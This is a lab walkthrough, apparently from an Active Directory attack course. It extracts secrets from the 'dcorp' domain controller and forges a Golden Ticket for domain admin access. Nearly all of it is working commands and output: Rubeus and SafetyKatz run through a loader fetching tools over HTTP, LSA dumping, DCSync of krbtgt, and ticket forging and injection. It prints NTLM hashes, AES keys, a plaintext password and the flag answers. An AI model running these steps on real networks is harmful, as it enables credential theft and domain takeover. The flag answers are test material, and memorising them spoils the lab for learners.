---
icon: vial
---

# 8 - Learning Object8️

## Tasks



1 - Extract secrets from the domain controller of dollarcorp

2 - Using the secrets of krbtgt account, create a Golden ticket

3 - Use the Golden ticket to (once again) get domain admin privileges from a machine

Flag 16 \[dcorp-dc] - NTLM hash of krbtgt  🚩

Flag 17 \[dcorp-dc] - NTLM hash of domain administrator - Administrator 🚩



## Solutions

### 1 - Extract secrets from the domain controller of dollarcorp

Starting to previous learning object 7 lab, we've already domain admin privileges, let's extract all the hashes on the domain controller (the command need to be executed from a process running with privileges of DA on the student VM).

Starting opening a new cmd as administrator and starting a new process as svcadmin's user:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```bash
Authentication Id : 0 ; 86511 (00000000:000151ef)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to extract credentials:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.34
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

```
RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 4e9815869d2090ccfca61c1fe0d23986

RID  : 00000459 (1113)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 0000045a (1114)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 0000045e (1118)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000045f (1119)
User : testda
LM   :
NTLM : a16452f790729fa34e8f3a08f234a82c

RID  : 00000460 (1120)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000461 (1121)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000462 (1122)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

RID  : 00001055 (4181)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 000042cd (17101)
User : devopsadmin
LM   :
NTLM : 63abbf0737c59a3142175b1665cd51ee

RID  : 00005079 (20601)
User : student861
LM   :
NTLM : 13c291a48547b0dedc67dc560aa02430

RID  : 0000507a (20602)
User : student862
LM   :
NTLM : f6d1206d61bd7f5ba7c61434bc7f857b

RID  : 0000507b (20603)
User : student863
LM   :
NTLM : 0ac5e63243f7b790f8c8545256e5cc01

RID  : 0000507c (20604)
User : student864
LM   :
NTLM : 70b0bc53a59129dc92eaa33eafb54f13

RID  : 0000507d (20605)
User : student865
LM   :
NTLM : 25d2e1c00413633345bb8a5414baa0e8

RID  : 0000507e (20606)
User : student866
LM   :
NTLM : d9c06de9bf9bf8774464c649fda61b1b

RID  : 0000507f (20607)
User : student867
LM   :
NTLM : 320e675610942d625c9a2aeaaf357b4a

RID  : 00005080 (20608)
User : student868
LM   :
NTLM : 21f6202cf6f337c1b900a73bcce4bbe2

RID  : 00005081 (20609)
User : student869
LM   :
NTLM : 36b9cadbc6bb0fef18fcd181ffca637a

RID  : 00005082 (20610)
User : student870
LM   :
NTLM : 1d1b00e47adbfa6fee1e4eab8bf8265c

RID  : 00005083 (20611)
User : student871
LM   :
NTLM : 723e06ec77440186563b86b90280f960

RID  : 00005084 (20612)
User : student872
LM   :
NTLM : 5551c9be6800506d69e7131091aec116

RID  : 00005085 (20613)
User : student873
LM   :
NTLM : 35c6036cbed32b8bb44933728aa4b2cf

RID  : 00005086 (20614)
User : student874
LM   :
NTLM : bf70e00a6e74de2375a1659816f3f824

RID  : 00005087 (20615)
User : student875
LM   :
NTLM : 31631805b4c850ba1f47ed799ef9f1e8

RID  : 00005088 (20616)
User : student876
LM   :
NTLM : e20be7c7a444a80e13f95100065abd84

RID  : 00005089 (20617)
User : student877
LM   :
NTLM : 4335c1e96adf7d9d9de6cd6fd6abd78b

RID  : 0000508a (20618)
User : student878
LM   :
NTLM : 79bf6cbf39c2e7323653b8aeac8fecbf

RID  : 0000508b (20619)
User : student879
LM   :
NTLM : 305a7531530afa990384459208100558

RID  : 0000508c (20620)
User : student880
LM   :
NTLM : 33536c5abf4628135ec63a7a46823548

RID  : 0000508d (20621)
User : Control861user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000508e (20622)
User : Control862user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000508f (20623)
User : Control863user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00005090 (20624)
User : Control864user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00005091 (20625)
User : Control865user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00005092 (20626)
User : Control866user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00005093 (20627)
User : Control867user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00005094 (20628)
User : Control868user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00005095 (20629)
User : Control869user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : e4ce16e20da2e11d2901e0fb8a4f28b0

RID  : 00000451 (1105)
User : DCORP-ADMINSRV$
LM   :
NTLM : b5f451985fd34d58d5120816d31b5565

RID  : 00000452 (1106)
User : DCORP-APPSRV$
LM   :
NTLM : b4cb7bf8b93c78b8051c7906bb054dc5

RID  : 00000453 (1107)
User : DCORP-CI$
LM   :
NTLM : ed495c08d350f0809ecf60aedc42fbd3

RID  : 00000454 (1108)
User : DCORP-MGMT$
LM   :
NTLM : 0878da540f45b31b974f73312c18e754

RID  : 00000455 (1109)
User : DCORP-MSSQL$
LM   :
NTLM : b205f1ca05bedace801893d6aa5aca27

RID  : 00000456 (1110)
User : DCORP-SQL1$
LM   :
NTLM : 3686dfb420dc0f9635e70c6ca5875b49

RID  : 0000106a (4202)
User : DCORP-STDADMIN$
LM   :
NTLM : 9c7374e4e73a2cdaf014ab6da104ba54

RID  : 000050c9 (20681)
User : DCORP-STD861$
LM   :
NTLM : 83dd4eea79636515a774c6e59dbc0071

RID  : 000050ca (20682)
User : DCORP-STD862$
LM   :
NTLM : 24ca16461638142f7ab28f86e26f8144

RID  : 000050cb (20683)
User : DCORP-STD863$
LM   :
NTLM : fe6a068e0679afacfd5fe4a7652d2ca3

RID  : 000050cc (20684)
User : DCORP-STD864$
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

NTLM : `4e9815869d2090ccfca61c1fe0d23986`

To get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack. Run the below command from process running as Domain Admin on the student VM:

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

```powershell
Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!
```

### 2 - Using the secrets of krbtgt account, create a Golden ticket

We can create a golden ticket using the following Rubeus command:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

```powershell
C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:727 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
```

now we need to add this command as argument to Loader and forge a Golden ticket adding`C:\AD\Tools\Loader.exe -path`  and `/ptt` at the end of the generated command to inject it in the current process:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

### 3 - Use the Golden ticket to (once again) get domain admin privileges from a machine

After importing golden ticket, we can access and check our privileges

```powershell
winrs -r:dcorp-dc cmd
set username
set computername
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

### Flag 16 \[dcorp-dc] - NTLM hash of krbtgt  🚩

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

NTLM : `4e9815869d2090ccfca61c1fe0d23986`

### Flag 17 \[dcorp-dc] - NTLM hash of domain administrator - Administrator 🚩

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

NTLM : `af0686cc0ca8f04df42210c9ac980760`
